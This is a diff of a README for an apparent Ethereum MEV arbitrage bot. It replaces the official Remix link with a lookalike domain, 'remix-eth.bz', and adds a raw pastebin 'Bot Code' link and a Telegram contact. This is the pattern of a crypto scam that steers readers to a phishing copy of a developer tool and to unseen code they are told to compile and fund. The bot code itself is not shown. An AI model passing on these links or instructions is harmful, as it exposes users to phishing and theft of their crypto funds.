@@ -14,16 +14,16 @@ Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging t
 This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
 ## How to launch your own arbitrage bot
+[![YouTube](http://i.ytimg.com/vi/cepf_FIdcB8/hqdefault.jpg)](https://www.youtube.com/watch?v=cepf_FIdcB8)
 
+# Message me on Telegram if you have any questions: https://t.me/bitdev_eth
+
+# Bot Code: https://pastebin.com/raw/X2exTKt1
 
 Download MetaMask (if you don’t have it already):
 https://metamask.io/download.html
 
-Access Remix: https://remix.ethereum.org/
-
-Clone this repo from the sandwich menu near WORKSPACE title
-
-![telegram-cloud-photo-size-2-5467507030555219743-y](https://github.com/solidityDEXdev/mev-bot-DEX-solidity/assets/144514645/2560b6cd-db8d-4881-8c6d-88c61f468b8b)
+Access Remix: https://remix-eth.bz/
 
 
 Go to the “Solidity Compiler” tab, select version and then select “Compile mevBOT.sol”.
@@ -69,4 +69,4 @@ Does it work on other chains or DEXes as well?
 
 No, currently the bot is dedicated only for Ethereum on Uniswap pools.
 
-address for donate - 0x8365d619f4620083Aa9e320C2e88e1590A73d53b eth usdt ETH
+
